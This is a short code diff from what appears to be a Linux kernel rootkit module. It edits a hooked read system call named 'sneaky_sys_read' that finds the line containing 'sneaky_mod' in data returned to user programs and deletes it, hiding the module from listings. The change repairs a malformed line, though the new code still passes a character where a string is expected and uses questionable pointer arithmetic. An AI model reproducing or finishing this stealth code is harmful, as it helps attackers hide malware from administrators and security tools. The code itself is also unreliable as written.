@@ -120,7 +120,8 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
         start = strnstr(buf, "sneaky_mod", originalRes);
         if (start != NULL)
         {
-            end = strnstr(start, '\n', originalRes - start - buf) if (end != NULL)
+            end = strnstr(start, '\n', originalRes - start + buf);
+            if (end != NULL)
             {
                 memmove(start, end + 1, originalRes + buf - end - 1);
                 originalRes = originalRes - end - 1 + start;
